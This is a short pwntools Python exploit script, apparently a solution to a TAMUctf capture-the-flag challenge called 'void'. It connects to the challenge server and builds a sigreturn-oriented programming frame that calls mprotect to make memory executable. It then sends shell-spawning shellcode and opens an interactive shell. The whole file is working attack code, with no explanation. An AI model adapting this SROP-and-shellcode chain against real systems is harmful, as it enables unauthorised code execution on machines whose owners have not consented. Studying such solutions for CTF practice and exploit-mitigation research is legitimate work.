#!/usr/bin/env python3

from pwn import *

exe = ELF("./void")

context.binary = exe


def conn():
    if args.LOCAL:
        if args.GDB:
            r = gdb.debug([exe.path],gdbscript="b *0x401018\nc\nc\nc\nc\nc")
        else:
            r = process([exe.path])
    else:
        r = remote("tamuctf.com", 443, ssl=True, sni="void")

    return r


import time

ENTRY = 0x00000000400018

SYSCALL_RET = 0x0000000000401018
RET = 0x000000000040101a
def main():
    r = conn()

    frame = SigreturnFrame()
    frame.rip = SYSCALL_RET
    frame.rsp = ENTRY
    frame.rax = 10
    frame.rdi = 0x400000
    frame.rsi = 0x1000
    frame.rdx = 7
    chain = b""
    chain += p64(exe.symbols['main'])
    chain += p64(SYSCALL_RET)
    chain += bytes(frame)
    r.send(chain)
    time.sleep(0.1)
    r.send(chain[8:][:15].ljust(15,b'\x00'))
    time.sleep(0.1)

    r.send(p64(0x00000000400020) + asm("add rsp, 100") + asm(shellcraft.sh()))

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()

